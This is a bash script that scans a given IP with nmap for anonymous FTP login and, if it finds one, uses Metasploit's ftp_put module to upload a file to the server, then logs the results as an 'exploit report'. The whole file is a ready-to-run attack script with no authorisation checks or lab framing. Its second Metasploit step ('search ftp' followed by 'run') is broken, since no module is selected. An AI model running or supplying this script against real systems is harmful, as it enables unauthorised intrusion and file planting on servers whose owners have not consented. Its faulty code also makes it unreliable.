#!/bin/bash

# Check if IP address argument is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <ip_address>"
    exit 1
fi

IP="$1"

# Create a report file
EXPLOIT_REPORT="exploit_report_for_${IP}.txt"
echo "Exploit Report for $IP" >"$EXPLOIT_REPORT"
echo "-----------------------------------------" >>"$EXPLOIT_REPORT"

# Step 1: Check for anonymous login using nmap
echo "Checking for anonymous login on $IP using nmap..." | tee -a "$EXPLOIT_REPORT"
nmap -p 21 --script=ftp-anon "$IP" -oN nmap_anon_check_$IP.txt
anon_result=$(grep "Anonymous FTP login allowed" nmap_anon_check_$IP.txt)

if [ -n "$anon_result" ]; then
    echo "Anonymous login allowed on $IP" | tee -a "$EXPLOIT_REPORT"

    # Step 2: Attempt to exploit the FTP server
    echo "Attempting to exploit the FTP server..." | tee -a "$EXPLOIT_REPORT"

    # Using Metasploit to upload a file via anonymous FTP
    msfconsole -q -x "
        use auxiliary/admin/ftp/ftp_put
        set RHOSTS $IP
        set RPORT 21
        set USERNAME anonymous
        set PASSWORD anonymous
        set FTPFILE /path/to/your/file.txt
        set DESTINATION /path/on/server/file.txt
        run
        exit
    " | tee -a "$EXPLOIT_REPORT"

    # Optionally, you can use Metasploit to check for other known FTP exploits
    echo "Checking for other FTP exploits..." | tee -a "$EXPLOIT_REPORT"
    exploit_result=$(msfconsole -q -x "
        search ftp
        set RHOSTS $IP
        run
        exit
    " | tee -a "$EXPLOIT_REPORT")

    echo "$exploit_result" >>"$EXPLOIT_REPORT"

else
    echo "Anonymous login not allowed on $IP. Exploitation not possible." | tee -a "$EXPLOIT_REPORT"
fi

# Cleanup intermediate files
rm nmap_anon_check_$IP.txt

echo "Exploitation script completed. Report saved to $EXPLOIT_REPORT."
